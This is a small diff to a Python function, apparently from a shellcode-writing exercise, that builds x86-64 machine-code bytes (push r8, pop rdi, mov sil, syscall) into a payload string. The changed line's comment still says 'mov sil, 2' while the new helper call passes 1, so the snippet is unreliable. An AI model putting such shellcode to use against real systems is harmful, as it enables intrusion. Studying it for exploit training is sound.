@@ -15,7 +15,7 @@ def partie5():
 
     pushr8 = '\\x41\\x50' # push r8
     poprdi = '\\x5f' # pop rdi
-    movsil = '\\x40\\xb6\\x02' # mov sil, 2
+    movsil = movxl('sil',1) # mov sil, 2
     syscall = '\\x0f\\x05' # syscall
 
     resultat_concat = resultat + pushr8 + poprdi + movsil + syscall
